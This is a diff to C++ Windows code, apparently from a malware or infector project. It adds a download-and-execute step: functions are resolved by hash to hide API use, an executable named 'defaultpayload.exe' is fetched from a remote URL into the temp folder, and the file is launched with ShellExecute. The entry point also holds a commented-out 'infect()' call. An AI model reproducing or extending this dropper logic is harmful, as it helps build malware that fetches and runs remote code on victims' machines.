@@ -388,6 +388,7 @@ int callout(void)
 
    LoadLibraryAHeader loadLibrary = reinterpret_cast<LoadLibraryAHeader>(get_proc_by_hash(reinterpret_cast<PIMAGE_DOS_HEADER>(kernel32->DllBase), 0x53b2070f));
    GetTempPath2AHeader getTempPath2 = reinterpret_cast<GetTempPath2AHeader>(get_proc_by_hash(reinterpret_cast<PIMAGE_DOS_HEADER>(kernel32->DllBase), 0x7994452b));
+   GetFileAttributesAHeader getFileAttributes = reinterpret_cast<GetFileAttributesAHeader>(get_proc_by_hash(reinterpret_cast<PIMAGE_DOS_HEADER>(kernel32->DllBase), 0xda1a7563));
    char urlmonDll[] = {'u','r','l','m','o','n','.','d','l','l',0};
    PIMAGE_DOS_HEADER urlmonModule = reinterpret_cast<PIMAGE_DOS_HEADER>(loadLibrary(urlmonDll));
    URLDownloadToFileHeader urlDownloadToFile = reinterpret_cast<URLDownloadToFileHeader>(get_proc_by_hash(urlmonModule, 0xe6c2ead5));
@@ -407,7 +408,22 @@ int callout(void)
    getTempPath2(MAX_PATH, temp_path);
    strncat(temp_path, slash_sheep, strlen(slash_sheep));
 
-   std::wcout << "GetFileAttributesA: " << std::hex << fnv321a("GetFileAttributesA") << std::endl;
+   if (getFileAttributes(temp_path) == INVALID_FILE_ATTRIBUTES)
+   {
+      std::wcout << "Downloading payload..." << std::endl;
+
+      if (urlDownloadToFile(nullptr,
+                            "https://github.com/frank2/blenny/raw/main/res/defaultpayload.exe",
+                            temp_path,
+                            0,
+                            nullptr) != 0)
+         return 2;
+   }
+
+   std::wcout << "Executing payload..." << std::endl;
+
+   if (static_cast<DWORD>(shellExecute(nullptr, nullptr, temp_path, nullptr, nullptr, 1)) <= 32)
+      return 3;
    
    return 0;
 }
@@ -415,6 +431,5 @@ int callout(void)
 int wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nCmdShow)
 {
    //infect();
-   callout();
-   return 0;
+   return callout();
 }
